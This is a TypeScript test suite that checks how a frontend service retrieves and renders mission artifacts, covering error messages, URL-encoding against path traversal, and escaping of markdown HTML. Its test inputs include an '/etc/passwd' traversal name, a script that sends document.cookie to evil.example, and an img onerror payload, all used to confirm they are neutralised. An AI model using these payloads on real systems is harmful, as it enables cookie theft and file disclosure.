/**
 * DEF-REP-02 / DEF-REP-03: Mission Artifact Retrieval & Rendering Contract Test Suite.
 * Validates:
 * - Artifact list fetch success (cards data) and empty-mission state
 * - 403/404 backend error messages surfaced verbatim
 * - Artifact names are URL-encoded before reaching the fetch URL (path-traversal safety)
 * - Markdown content renders as escaped text, never executable HTML (XSS safety)
 */

import React from "react";
import { renderToStaticMarkup } from "react-dom/server";
import ReactMarkdown from "react-markdown";
import {
  listMissionArtifacts,
  getMissionArtifact,
  isMarkdownArtifact,
} from "../services/orchestratorApi";

const assert = {
  strictEqual(actual: unknown, expected: unknown, message?: string) {
    if (actual !== expected) {
      throw new Error(message || `Expected ${JSON.stringify(expected)}, got ${JSON.stringify(actual)}`);
    }
  },
  ok(val: unknown, message?: string) {
    if (!val) {
      throw new Error(message || `Expected value to be truthy, got ${JSON.stringify(val)}`);
    }
  },
  match(val: string, regex: RegExp, message?: string) {
    if (!regex.test(val)) {
      throw new Error(message || `Expected "${val}" to match ${regex}`);
    }
  },
  notMatch(val: string, regex: RegExp, message?: string) {
    if (regex.test(val)) {
      throw new Error(message || `Expected "${val}" NOT to match ${regex}`);
    }
  },
};

interface MockedResponse {
  status: number;
  statusText?: string;
  body: unknown;
  headers?: Record<string, string>;
}

interface MockFetchCall {
  url: string;
  init?: RequestInit;
}

function installMockFetch(responses: MockedResponse[]): { calls: MockFetchCall[]; restore: () => void } {
  const originalFetch = globalThis.fetch;
  const calls: MockFetchCall[] = [];
  let cursor = 0;

  const mockFetch = (async (url: string, init?: RequestInit) => {
    calls.push({ url, init });
    const scripted = responses[cursor++];
    if (!scripted) {
      throw new Error(`Mock fetch invoked more times (call #${cursor}) than scripted (${responses.length})`);
    }
    const bodyText = typeof scripted.body === "string" ? scripted.body : JSON.stringify(scripted.body);
    const headerMap = new Map(Object.entries(scripted.headers || {}));
    return {
      ok: scripted.status >= 200 && scripted.status < 300,
      status: scripted.status,
      statusText: scripted.statusText ?? "",
      text: async () => bodyText,
      json: async () => JSON.parse(bodyText),
      headers: { get: (k: string) => headerMap.get(k) ?? null },
    } as unknown as Response;
  }) as unknown as typeof fetch;

  globalThis.fetch = mockFetch;
  return {
    calls,
    restore: () => {
      globalThis.fetch = originalFetch;
    },
  };
}

async function runBattery() {
  console.log("============================================================");
  console.log("ARBOR DEF-REP-02/03: MISSION ARTIFACTS CONTRACT TEST BATTERY");
  console.log("============================================================");

  let passed = 0;
  let total = 0;

  async function test(name: string, fn: () => void | Promise<void>) {
    total++;
    try {
      await fn();
      console.log(`  ✓ TEST-${total.toString().padStart(2, "0")}: ${name}`);
      passed++;
    } catch (err: unknown) {
      console.error(`  ✗ TEST-${total.toString().padStart(2, "0")}: ${name}`);
      console.error(`    Error: ${err instanceof Error ? err.message : String(err)}`);
      throw err;
    }
  }

  // 1. List renders cards: success response maps to artifact summaries usable as card data
  await test("Artifact list: success response surfaces artifact cards with name/type/size", async () => {
    const { restore } = installMockFetch([
      {
        status: 200,
        body: {
          mission_id: "mission-1",
          workspace_id: "ws-1",
          artifacts: [
            { name: "report.md", artifact_type: "document", byte_size: 1024, mime_type: "text/markdown; charset=utf-8", has_content: true },
            { name: "diff.patch", artifact_type: "diff", byte_size: 512, mime_type: "text/x-diff; charset=utf-8", has_content: true },
          ],
        },
      },
    ]);
    try {
      const outcome = await listMissionArtifacts("mission-1", "ws-1");
      assert.strictEqual(outcome.kind, "success");
      if (outcome.kind !== "success") throw new Error("unreachable");
      assert.strictEqual(outcome.data.artifacts.length, 2);
      assert.strictEqual(outcome.data.artifacts[0].name, "report.md");
      assert.strictEqual(outcome.data.artifacts[1].artifact_type, "diff");
    } finally {
      restore();
    }
  });

  // 2. Empty state: mission with zero artifacts
  await test("Artifact list: mission with no artifacts resolves to an empty, non-error list", async () => {
    const { restore } = installMockFetch([
      { status: 200, body: { mission_id: "mission-2", workspace_id: "ws-1", artifacts: [] } },
    ]);
    try {
      const outcome = await listMissionArtifacts("mission-2", "ws-1");
      assert.strictEqual(outcome.kind, "success");
      if (outcome.kind !== "success") throw new Error("unreachable");
      assert.strictEqual(outcome.data.artifacts.length, 0);
    } finally {
      restore();
    }
  });

  // 3. 403 error shown verbatim
  await test("Artifact list: 403 cross-workspace error surfaces the backend detail verbatim", async () => {
    const { restore } = installMockFetch([
      { status: 403, body: { detail: "Access denied: Viewer role required for workspace 'ws-1'." } },
    ]);
    try {
      const outcome = await listMissionArtifacts("mission-3", "ws-1");
      assert.strictEqual(outcome.kind, "error");
      if (outcome.kind !== "error") throw new Error("unreachable");
      assert.strictEqual(outcome.status, 403);
      assert.strictEqual(outcome.detailText, "Access denied: Viewer role required for workspace 'ws-1'.");
    } finally {
      restore();
    }
  });

  // 4. 404 error shown verbatim (single artifact fetch)
  await test("Artifact content: 404 not-found error surfaces the backend detail verbatim", async () => {
    const { restore } = installMockFetch([
      { status: 404, body: { detail: "Artifact 'missing.md' not found for mission 'mission-4'." } },
    ]);
    try {
      const outcome = await getMissionArtifact("mission-4", "missing.md", "ws-1");
      assert.strictEqual(outcome.kind, "error");
      if (outcome.kind !== "error") throw new Error("unreachable");
      assert.strictEqual(outcome.status, 404);
      assert.strictEqual(outcome.detailText, "Artifact 'missing.md' not found for mission 'mission-4'.");
    } finally {
      restore();
    }
  });

  // 5. Path-traversal artifact name is URL-encoded, never reaches the fetch URL raw
  await test("Artifact content: path-traversal artifact name is URL-encoded before reaching the fetch URL", async () => {
    const { calls, restore } = installMockFetch([
      { status: 200, body: "irrelevant", headers: { "Content-Type": "text/plain" } },
    ]);
    try {
      const maliciousName = "../../../etc/passwd";
      await getMissionArtifact("mission-5", maliciousName, "ws-1");
      const calledUrl = calls[0].url;
      // The raw ".. /" path-traversal sequence (with its directory separator) must never appear
      // unescaped in the request URL -- only its percent-encoded form.
      assert.notMatch(calledUrl, /\.\.\//, "raw '../' must not reach the fetch URL");
      assert.match(calledUrl, /%2F/, "the artifact name's slashes must be percent-encoded");
      assert.match(calledUrl, new RegExp(encodeURIComponent(maliciousName)));
    } finally {
      restore();
    }
  });

  // 5b. Encoded-slash artifact name is double-encoded, never decoded into a raw separator
  await test("Artifact content: an already-encoded-slash artifact name is encoded again, not decoded", async () => {
    const { calls, restore } = installMockFetch([
      { status: 200, body: "irrelevant", headers: { "Content-Type": "text/plain" } },
    ]);
    try {
      const encodedSlashName = "..%2F..%2Fetc%2Fpasswd";
      await getMissionArtifact("mission-5b", encodedSlashName, "ws-1");
      const calledUrl = calls[0].url;
      assert.notMatch(calledUrl, /\.\.\//, "raw '../' must never appear, even from a pre-encoded name");
      // '%' itself must be escaped to %25 so the literal characters "%2F" survive as text,
      // rather than being interpreted as a decoded "/" by any intermediary.
      assert.match(calledUrl, /%252F/, "the literal '%2F' substring must itself be percent-encoded");
    } finally {
      restore();
    }
  });

  // 6. Markdown artifact detection
  await test("isMarkdownArtifact: detects by MIME type and by file extension fallback", () => {
    assert.strictEqual(isMarkdownArtifact("report.md", "text/markdown; charset=utf-8"), true);
    assert.strictEqual(isMarkdownArtifact("REPORT.MARKDOWN", null), true);
    assert.strictEqual(isMarkdownArtifact("notes.txt", "text/plain"), false);
    assert.strictEqual(isMarkdownArtifact("data.json", "application/json"), false);
    // WORKSPACE_DISK rows may omit mime_type entirely -- extension fallback must still work.
    assert.strictEqual(isMarkdownArtifact("ARBOR_LEVEL3_SELF_ANALYSIS.md", undefined), true);
  });

  // 7. Markdown containing a <script> tag renders as escaped text, never an executable element
  await test("Markdown rendering: a <script> tag in content is displayed as text, not executed", () => {
    const malicious = "# Report\n\nSee findings below.\n\n<script>fetch('https://evil.example/steal?c='+document.cookie)</script>";
    const html = renderToStaticMarkup(React.createElement(ReactMarkdown, {}, malicious));
    assert.notMatch(html, /<script[\s>]/i, "a live <script> element must never be present in the rendered output");
    assert.match(html, /&lt;script&gt;/, "the script tag must appear as escaped, literal text");
  });

  // 8. Markdown containing an inline <img onerror=...> renders as escaped text, never a live handler
  await test("Markdown rendering: an <img onerror=...> tag in content is displayed as text, not a live handler", () => {
    const malicious = "Profile picture: <img src=x onerror=\"alert(document.domain)\">";
    const html = renderToStaticMarkup(React.createElement(ReactMarkdown, {}, malicious));
    // A live <img ...> element (real DOM tag, not escaped text) would be the XSS vector;
    // its absence is what matters -- "onerror=" as literal escaped text is harmless.
    assert.notMatch(html, /<img[^>]*onerror/i, "no live <img onerror=...> element must be present in the rendered output");
    assert.match(html, /&lt;img/, "the img tag must appear as escaped, literal text");
  });

  // 9. Ordinary markdown image syntax (not raw HTML) still renders safely as a real <img>
  // with no injected event handler -- confirms normal reports keep working, not just that
  // attacks are blocked.
  await test("Markdown rendering: normal markdown image syntax renders a safe <img> with no handlers", () => {
    const content = "![diagram](https://example.com/diagram.png \"Architecture\")";
    const html = renderToStaticMarkup(React.createElement(ReactMarkdown, {}, content));
    assert.match(html, /<img[^>]*src="https:\/\/example\.com\/diagram\.png"/);
    assert.notMatch(html, /onerror|onload|onclick/i);
  });

  console.log("============================================================");
  console.log(`BATTERY COMPLETE: ${passed}/${total} test specifications passed.`);
  console.log("============================================================");
}

await runBattery();
